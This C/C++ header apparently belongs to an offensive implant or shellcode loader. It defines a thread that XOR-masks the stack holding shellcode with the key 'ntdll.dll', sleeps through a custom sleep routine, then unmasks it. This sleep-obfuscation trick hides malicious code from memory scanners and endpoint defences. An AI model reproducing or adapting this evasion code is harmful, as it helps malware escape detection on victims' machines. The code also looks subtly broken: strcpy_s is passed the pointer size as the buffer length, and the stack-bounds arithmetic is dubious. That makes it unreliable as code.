#pragma once

#include <stdlib.h>
#include <windows.h>
#include "selfsleep.h"


DWORD WINAPI EncryptThread(LPVOID lpParameter) {
    //saving the XOR key in Heap, so it won't get changed during stack encryption
    char *key = (char*) malloc(10*sizeof(char));
    strcpy_s(key, sizeof(key), "ntdll.dll");
    int keyLength = strlen(key);
    
    // cast the parameter to the stack pointer
    unsigned char *rsp = (unsigned char *) lpParameter;
    
    // Get the address range of the stack where the shellcode is stored
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(rsp, &mbi, sizeof(mbi));

    //calculate the stack Base (bottom of Stack) and the size of it
    //unsigned char *stackRegion = mbi.BaseAddress - 8192;
    unsigned char *stackRegion = reinterpret_cast<unsigned char*>(mbi.BaseAddress) - 8192;
    unsigned char *stackBase = stackRegion + mbi.RegionSize + 8192;
    int stackSize = stackBase - rsp;

    // mask the stack with a XOR key
    unsigned char *p = (unsigned char *)rsp;
    for (int i = 0; i < stackSize; i++) {
        *(p++) ^= key[i % keyLength];
    }

    __alt_sleepms(5*1000); //performing a custom sleep for 5 seconds

    // unmask the stack
    unsigned char *h = (unsigned char *)rsp;
    for (int i = 0; i < stackSize; i++) {
        *(h++) ^= key[i % keyLength];
    }
    
    free(key);
    return 0;
}





